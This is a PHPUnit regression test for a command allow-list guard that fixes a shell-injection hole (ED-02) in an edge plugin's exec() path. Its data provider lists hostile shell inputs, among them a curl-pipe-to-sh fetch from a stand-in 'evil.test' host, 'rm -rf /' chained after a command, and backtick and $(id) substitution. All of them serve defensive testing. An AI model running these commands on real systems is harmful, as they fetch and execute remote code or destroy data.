<?php

declare(strict_types=1);

namespace Tests\Unit\Plugins\Edge;

use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Plugins\Edge\Infrastructure\SystemProbe;

/**
 * Regression cover for ED-02: whole configuration strings were handed to exec()
 * with full shell interpretation, on a path that typically runs as root.
 */
#[CoversClass(SystemProbe::class)]
final class EdgeSecurityTest extends TestCase
{
    private function probe(string $command): array
    {
        return (new SystemProbe())->run($command);
    }

    /** @return list<array{string}> */
    public static function hostileCommands(): array
    {
        return [
            ['curl http://evil.test/x | sh'],
            ['nginx -t; rm -rf /'],
            ['nginx -t && curl evil.test'],
            ['nginx -t `whoami`'],
            ['nginx -t $(id)'],
            ['rm -rf /var'],
            ['/bin/sh -c "id"'],
            ['bash -c id'],
            [''],
        ];
    }

    #[DataProvider('hostileCommands')]
    public function test_a_disallowed_or_chained_command_is_refused(string $command): void
    {
        [$code, $out] = $this->probe($command);

        self::assertSame(126, $code, 'must not execute');
        self::assertStringContainsString('Refusing to run', $out);
    }

    public function test_an_allowed_binary_runs(): void
    {
        // 'true' is on the allow-list and is a real binary, so this proves the
        // guard permits legitimate commands rather than blocking everything.
        [$code] = $this->probe('true');

        self::assertSame(0, $code);
    }

    public function test_sudo_is_skipped_when_identifying_the_binary(): void
    {
        // The configured reload commands legitimately use sudo; the binary that
        // matters is the one AFTER it.
        [$code, $out] = $this->probe('sudo rm -rf /');

        self::assertSame(126, $code);
        self::assertStringContainsString('rm is not an allowed binary', $out);
    }

    public function test_an_absolute_path_is_matched_by_basename(): void
    {
        [$code, $out] = $this->probe('/usr/sbin/nginx -t');

        // nginx is allowed, so this is NOT refused by the allow-list. It may
        // still fail because nginx is absent here — the point is that the guard
        // let it through.
        self::assertNotSame(126, $code, $out);
    }

    public function test_the_allow_list_is_extensible_by_configuration(): void
    {
        $_ENV['EDGE_ALLOWED_BINARIES'] = 'echo';

        try {
            [$code] = $this->probe('echo hello');

            self::assertSame(0, $code);
        } finally {
            unset($_ENV['EDGE_ALLOWED_BINARIES']);
        }
    }
}
